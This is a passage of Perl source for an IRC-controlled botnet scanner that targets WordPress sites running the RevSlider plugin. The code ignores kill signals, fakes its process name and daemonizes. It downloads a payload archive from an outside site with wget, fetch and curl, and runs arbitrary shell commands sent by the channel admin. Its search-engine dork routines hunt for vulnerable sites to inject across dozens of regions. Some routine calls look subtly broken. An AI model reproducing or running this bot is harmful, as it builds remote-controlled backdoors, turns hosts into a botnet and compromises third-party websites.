my $jack12	= "".$fullmagic12."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack13	= "".$fullmagic13."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack14	= "".$fullmagic14."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack15	= "".$fullmagic15."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack16	= "".$fullmagic16."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack17	= "".$fullmagic17."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack18	= "".$fullmagic18."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack19	= "".$fullmagic19."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";
my $jack20	= "".$fullmagic20."?____pgfa=https%253A%252F%252Fwww.google.com%252Fsearch?q=";



if (@ARGV == 7) {
    print "\n[+] nob0dy Priv8 Scanner SE\n".
          "[+] IRC Host    : $ircserver\n".
          "[+] IRC Port    : $ircport\n".
          "[+] Bot Nick    : $nickname\n".
          "[+] Bot Ident   : $ident\n".
          "[+] Channel     : $channel\n".
          "[+] Bot Admin   : $admin\n".
          "[+] Process/PID : $fakeproc - $$\n\n";
}

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

chdir("/tmp");
chop (my $priper = `wget http://www.viverosgimeno.es/wp-content/rac/revslider.zip;fetch http://www.viverosgimeno.es/wp-content/rac/revslider.zip;curl -O http://www.viverosgimeno.es/wp-content/rac/revslider.zip`);
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}

sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
        $irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
        sleep 1;
    }
}

sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(999));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bx");
	sendraw("NS id lfi123");
	sleep(3);
        sendraw("JOIN $channel");
	sleep(1);
	sendraw("JOIN #shock 777");
	sleep(1);
        sendraw("PRIVMSG $channel :4SexCrime Database Rev Wordpress Priv8 Scanner SE v5.1");
        sendraw("PRIVMSG $admin :Hi $admin im here ready to Serve !!!");
    }
}

my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
		my $engine ="UAE,Myanmar,Argentina,Austria,Australia,Brazil,Canada,Chili,CoMersil,Czech,Germany,Denmark,Spain,Europe,France,Hungary,Indonesia,Israel,India,Info,Iran,Italy,Japan,Korea,Mexico,Malaysia,Network,Netherlands,Organization,Philippines,Polan,Romania,Russian,Thailand,Ukraine,England,USA,Slovenia,Belgium,Bussines,SouthAfrica,Vietnam,Tuvalu,Cocos,Turky,Asia,Serbia,Singapore,Taiwan,Sweden,Pakistan,Norway,Montenegro,Greece,Education,Goverment,Kazakhstan,
Afganistan,Albania,Algeria,Angola,Armenia,Azerbaijan,Bahrain,Bangladesh,Belarus,Bhutan,Bolivia,Bosnia,Bulgaria,Brunei,Cambodia,Cameroon,Christmas,CostaRika,Croatia,Cuba,Cyprus,Dominican,Equador,Egypt,Estonia,Finland,Georgia,Ghana,Grenada,Honduras,Hongkong,Iceland,Ireland,Kenya,Kuwait,Laos,Latvia,Liberia,
Libyan,Lithuania,Macedonia,Malta,Mongolia,Mozambique,Namibia,Nauru,Nepal,NewZealand,Nigeria,Paraguay,Peru,Portugal,PuertoRico,Qatar,SaintLucia,Samoa,SaudiArabia,Senegal,Slovakia,Srilanka,Swaziland,Tajikistan,Tanzania,Tokelau,Tonga,Tunisia,Uruguay,Uzbekistan,Venezuela,Yemen,Yugoslavia,Zambia,Uganda,Trinidad,Zimbabwe,
KonToL,PePek,TeTek,ItiL,Vagina,NenNen,SuSu,BuahDada,PayuDara,Kentot,eMeL,OraL,Klitoris,Masturbasi,Onani,Sperma,AnaL,Puting,Penis,MeMek,
GooGLeCA,GooGLeDE,GooGLeUK,GooGLeFR,GooGLeES,GooGLeIT,GooGLeNL,GooGLeBE,GooGLeCH,GooGLeSE,GooGLeDK,GooGLeNO,GooGLeNZ,GooGLeIE,GooGLeBR,GooGLeAR,GooGLeCO,GooGLeCU,GooGLeCL,GooGLeMX,GooGLeAU,GooGLeRU,GooGLeAT,GooGLePL,GooGLeIL,GooGLeTR,GooGLeUA,GooGLeGR,GooGLeJP,GooGLeCN,GooGLeMY,GooGLeTH,GooGLeIN,GooGLeKR,GooGLeRO,GooGLeTW,GooGLeZA,GooGLePT,BingDE,BingUK,BingCA,BingBR,BingFR,BingES,BingIT,BingBE,BingNL,BingPT,BingNO,BingDK,BingSE,BingCH,BingNZ,BingRU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,AsKCA,AsKDE,AsKIT,AsKFR,AsKES,AsKRU,AsKNL,AsKUK,AsKBR,AsKPL,AsKAU,AsKAT,AsKJP,AsKSE,AsKMX,AsKNO,AsKDK";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                #if ($msg =~ /^VERSION/) {
                 #   sendraw("NOTICE $nick :VERSION mIRC v6.21 Khaled Mardam-Bey");
                #}
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
            }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\.sh (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
		if (&isAdmin($nick) && $msg =~ /^!addadmin\ (.+) /) {
					if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					$newadmin = $1;
					$admin = $newadmin;
					&msg("$path","12 Admin added to4 $admin ");
				}}}
                ##################################################################### HELP COMMAND

                if ($msg=~ /^!help/) {
                    my $helplogo = "15(7@2Help15)";
			$inject = "";
         	  if (-e ($update_file)){ $inject = "3Ready!!!"; } else { $inject = "4Lost!!!"; }
		   &msg("$nick","$helplogo 12RevSlider Database Wordpress Scan:6 $revcmd [dork]");
		  # &msg("$nick","$helplogo 12RevSlider Database Wordpress Inject manual:6 $chkcmd [site]");
		   &msg("$nick","$helplogo 12Injector : $inject ");
		   &msg("$nick","$helplogo 12Check Bypass:6 !bypassrev");
                }
                if ($msg=~ /^!response/ || $msg=~ /^!id/) {
                    	$inject = "";
			if (-e ($update_file)){ $inject = "3Ready!!!"; } else { $inject = "4Lost!!!"; }
			&msg("$path","12Injector : $inject ");
		}
                
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","6Fake Process/PID : $fakeproc - $$");
                }
				if ($msg=~/^!bypassrev/){
				if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
					&msg("$path","Checking 20 Bypass, please wait...");
					my $bystats1 = "";my $bystats2 = "";my $bystats3 = "";my $bystats4 = "";my $bystats5 = "";my $bystats6 = "";my $bystats7 = "";my $bystats8 = "";my $bystats9 = "";my $bystats10 = "";
					my $bystats11 = "";my $bystats12 = "";my $bystats13 = "";my $bystats14 = "";my $bystats15 = "";my $bystats16 = "";my $bystats17 = "";my $bystats18 = "";my $bystats19 = "";my $bystats20 = "";
					my $cekby1 = &get_content($jack1."search");
					if ($cekby1 =~ /search/i){ $bystats1 = "6Up!!!"; } else { $bystats1 = "4lost!!!"; }
					my $cekby2 = &get_content($jack2."search");
					if ($cekby2 =~ /search/i){ $bystats2 = "6Up!!!"; } else { $bystats2 = "4lost!!!"; }
					my $cekby3 = &get_content($jack3."search");
					if ($cekby3 =~ /search/i){ $bystats3 = "6Up!!!"; } else { $bystats3 = "4lost!!!"; }
					my $cekby4 = &get_content($jack4."search");
					if ($cekby4 =~ /search/i){ $bystats4 = "6Up!!!"; } else { $bystats4 = "4lost!!!"; }
					my $cekby5 = &get_content($jack5."search");
					if ($cekby5 =~ /search/i){ $bystats5 = "6Up!!!"; } else { $bystats5 = "4lost!!!"; }
					my $cekby6 = &get_content($jack6."search");
					if ($cekby6 =~ /search/i){ $bystats6 = "6Up!!!"; } else { $bystats6 = "4lost!!!"; }
					my $cekby7 = &get_content($jack7."search");
					if ($cekby7 =~ /search/i){ $bystats7 = "6Up!!!"; } else { $bystats7 = "4lost!!!"; }
					my $cekby8 = &get_content($jack8."search");
					if ($cekby8 =~ /search/i){ $bystats8 = "6Up!!!"; } else { $bystats8 = "4lost!!!"; }
					my $cekby9 = &get_content($jack9."search");
					if ($cekby9 =~ /search/i){ $bystats9 = "6Up!!!"; } else { $bystats9 = "4lost!!!"; }
					my $cekby10 = &get_content($jack10."search");
					if ($cekby10 =~ /search/i){ $bystats10 = "6Up!!!"; } else { $bystats10 = "4lost!!!"; }
					my $cekby11 = &get_content($jack11."search");
					if ($cekby11 =~ /search/i){ $bystats11 = "6Up!!!"; } else { $bystats11 = "4lost!!!"; }
					my $cekby12 = &get_content($jack12."search");
					if ($cekby12 =~ /search/i){ $bystats12 = "6Up!!!"; } else { $bystats12 = "4lost!!!"; }
					my $cekby13 = &get_content($jack13."search");
					if ($cekby13 =~ /search/i){ $bystats13 = "6Up!!!"; } else { $bystats13 = "4lost!!!"; }
					my $cekby14 = &get_content($jack14."search");
					if ($cekby14 =~ /search/i){ $bystats14 = "6Up!!!"; } else { $bystats14 = "4lost!!!"; }
					my $cekby15 = &get_content($jack15."search");
					if ($cekby15 =~ /search/i){ $bystats15 = "6Up!!!"; } else { $bystats15 = "4lost!!!"; }
					my $cekby16 = &get_content($jack16."search");
					if ($cekby16 =~ /search/i){ $bystats16 = "6Up!!!"; } else { $bystats16 = "4lost!!!"; }
					my $cekby17 = &get_content($jack17."search");
					if ($cekby17 =~ /search/i){ $bystats17 = "6Up!!!"; } else { $bystats17 = "4lost!!!"; }
					my $cekby18 = &get_content($jack18."search");
					if ($cekby18 =~ /search/i){ $bystats18 = "6Up!!!"; } else { $bystats18 = "4lost!!!"; }
					my $cekby19 = &get_content($jack19."search");
					if ($cekby19 =~ /search/i){ $bystats19 = "6Up!!!"; } else { $bystats19 = "4lost!!!"; }
					my $cekby20 = &get_content($jack20."search");
					if ($cekby20 =~ /search/i){ $bystats20 = "6Up!!!"; } else { $bystats20 = "4lost!!!"; }	
					&msg("$path","12 Mesin1= $bystats1 12Mesin2= $bystats2 12Mesin3= $bystats3 12Mesin4= $bystats4 12Mesin5= $bystats5 12 Mesin6= $bystats6 12Mesin7= $bystats7 12Mesin8= $bystats8 12Mesin9= $bystats9 12Mesin10= $bystats10 12 Mesin11= $bystats11 12Mesin12= $bystats12 12Mesin13= $bystats13 12Mesin14= $bystats14 12Mesin15= $bystats15 12 Mesin16= $bystats16 12Mesin17= $bystats17 12Mesin18= $bystats18 12Mesin19= $bystats19 12Mesin20= $bystats20")
				}}}
                ##################################################################### Command SCAN
		
                	
		if ($msg =~ /^$revcmd\s+(.*)/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
		if (-e ($update_file)) {
		my $dork = $1;
		my $check = &read_dorks($dork);
		if ($check == 1) {
		&msg("$path","$searchlogo 4Ga bisa $nick bangsattt...itu2 aja dorkmu boss.. "); exit;
		} else {
		&msg("$path","$searchlogo 3Si $nick lagi scan Revslider Plugins Wordpress di $path ");
		&msg("$path","$searchlogo 12Dork :4 $dork");
		&msg("$path","$searchlogo 12Please wait for 1 hour from now..");
                sendraw("MODE $path +m");
		&write_dorks($dork);
		&se_start($path,$bug,$dork,$engine,1,$nick);
		}
		}else {
                &msg("$path","[ $nick ] $revlogo 4Injector is Lost!");
                }
		}
		exit;
		}
		}

		
                #####################################################################

            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                parse("$line");
            } else {
                if ($#lines == 0) {
                    parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }
    }
}

##########################################################################################	Search engine
sub type() {
my ($chan,$bug,$dork,$engine,$type,$nick) = @_;
	   if ($type == 1){$type=&revslider($chan,$bug,$dork,$engine,$nick);}
	elsif ($type == 2){$type=&showbiz($chan,$bug,$dork,$engine,$nick);}
}	
sub se_start() {
my ($chan,$bug,$dork,$engine,$type,$nick) = @_;
    	if ($engine =~ /uae/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"UAE",$type,$nick); } exit; } }
	if ($engine =~ /myanmar/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &lfi($chan,$bug,dork,"Myanmar",$type,$nick); } exit; } }
	if ($engine =~ /argentina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Argentina",$type,$nick); } exit; } }

	if ($engine =~ /austria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Austria",$type,$nick); } exit; } }
	if ($engine =~ /australia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Australia",$type,$nick); } exit; } }
	if ($engine =~ /brazil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brazil",$type,$nick); } exit; } }
	if ($engine =~ /canada/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Canada",$type,$nick); } exit; } }
	if ($engine =~ /chili/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Chili",$type,$nick); } exit; } }
	if ($engine =~ /cina/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cina",$type,$nick); } exit; } }
	if ($engine =~ /comersil/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CoMersil",$type,$nick); } exit; } }
	if ($engine =~ /czech/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Czech",$type,$nick); } exit; } }
	if ($engine =~ /germany/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Germany",$type,$nick); } exit; } }
	if ($engine =~ /denmark/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Denmark",$type,$nick); } exit; } }
	if ($engine =~ /spain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Spain",$type,$nick); } exit; } }
	if ($engine =~ /europe/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Europe",$type,$nick); } exit; } }
	if ($engine =~ /france/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"France",$type,$nick); } exit; } }
	if ($engine =~ /hungary/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Hungary",$type,$nick); } exit; } }
	if ($engine =~ /indonesia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Indonesia",$type,$nick); } exit; } }
	if ($engine =~ /israel/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Israel",$type,$nick); } exit; } }
	if ($engine =~ /india/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"India",$type,$nick); } exit; } }
	if ($engine =~ /info/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Info",$type,$nick); } exit; } }
	if ($engine =~ /iran/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Iran",$type,$nick); } exit; } }
	if ($engine =~ /italy/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Italy",$type,$nick); } exit; } }
	if ($engine =~ /japan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Japan",$type,$nick); } exit; } }
	if ($engine =~ /korea/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Korea",$type,$nick); } exit; } }
	if ($engine =~ /mexico/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Mexico",$type,$nick); } exit; } }
	if ($engine =~ /malaysia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Malaysia",$type,$nick); } exit; } }
	if ($engine =~ /network/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Network",$type,$nick); } exit; } }
	if ($engine =~ /netherlands/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Netherlands",$type,$nick); } exit; } }
	if ($engine =~ /organization/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Organization",$type,$nick); } exit; } }
	if ($engine =~ /philippines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Philippines",$type,$nick); } exit; } }
	if ($engine =~ /poland/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Poland",$type,$nick); } exit; } }
	if ($engine =~ /romania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Romania",$type,$nick); } exit; } }
	if ($engine =~ /russian/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Russian",$type,$nick); } exit; } }	
	if ($engine =~ /thailand/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Thailand",$type,$nick); } exit; } }
	if ($engine =~ /ukraine/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Ukraine",$type,$nick); } exit; } }
	if ($engine =~ /england/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"England",$type,$nick); } exit; } }
	if ($engine =~ /usa/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"USA",$type,$nick); } exit; } }
	if ($engine =~ /slovenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Slovenia",$type,$nick); } exit; } }
	if ($engine =~ /belgium/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belgium",$type,$nick); } exit; } }
	if ($engine =~ /bussines/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bussines",$type,$nick); } exit; } }
	if ($engine =~ /southafrica/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"SouthAfrica",$type,$nick); } exit; } }
	if ($engine =~ /vietnam/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Vietnam",$type,$nick); } exit; } }
	if ($engine =~ /tuvalu/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Tuvalu",$type,$nick); } exit; } }
	if ($engine =~ /cocos/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cocos",$type,$nick); } exit; } }
	if ($engine =~ /turky/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Turky",$type,$nick); } exit; } }
	if ($engine =~ /asia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Asia",$type,$nick); } exit; } }
	if ($engine =~ /serbia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Serbia",$type,$nick); } exit; } }
	if ($engine =~ /singapore/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Singapore",$type,$nick); } exit; } }
	if ($engine =~ /taiwan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Taiwan",$type,$nick); } exit; } }
	if ($engine =~ /sweden/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Sweden",$type,$nick); } exit; } }
	if ($engine =~ /pakistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Pakistan",$type,$nick); } exit; } }
	if ($engine =~ /norway/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Norway",$type,$nick); } exit; } }
	if ($engine =~ /montenegro/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Montenegro",$type,$nick); } exit; } }
	if ($engine =~ /greece/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Greece",$type,$nick); } exit; } }
	if ($engine =~ /education/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Education",$type,$nick); } exit; } }
	if ($engine =~ /goverment/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Goverment",$type,$nick); } exit; } }
	if ($engine =~ /kazakhstan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Kazakhstan",$type,$nick); } exit; } }
	if ($engine =~ /afganistan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &lfi($chan,$bug,dork,"Afganistan",$type,$nick); } exit; } }
	if ($engine =~ /albania/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Albania",$type,$nick); } exit; } }
	if ($engine =~ /algeria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Algeria",$type,$nick); } exit; } }
	if ($engine =~ /angola/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Angola",$type,$nick); } exit; } }
	if ($engine =~ /armenia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Armenia",$type,$nick); } exit; } }
	if ($engine =~ /azerbaijan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Azerbaijan",$type,$nick); } exit; } }
	if ($engine =~ /bahrain/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bahrain",$type,$nick); } exit; } }
	if ($engine =~ /bangladesh/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bangladesh",$type,$nick); } exit; } }
	if ($engine =~ /belarus/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Belarus",$type,$nick); } exit; } }
	if ($engine =~ /bhutan/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bhutan",$type,$nick); } exit; } }
	if ($engine =~ /bolivia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bolivia",$type,$nick); } exit; } }
	if ($engine =~ /bosnia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bosnia",$type,$nick); } exit; } }
	if ($engine =~ /bulgaria/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Bulgaria",$type,$nick); } exit; } }
	if ($engine =~ /brunei/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Brunei",$type,$nick); } exit; } }
	if ($engine =~ /cambodia/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cambodia",$type,$nick); } exit; } }
	if ($engine =~ /cameroon/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Cameroon",$type,$nick); } exit; } }
	if ($engine =~ /christmas/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"Christmas",$type,$nick); } exit; } }
	if ($engine =~ /costarika/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$dork,"CostaRika",$type,$nick); } exit; } }
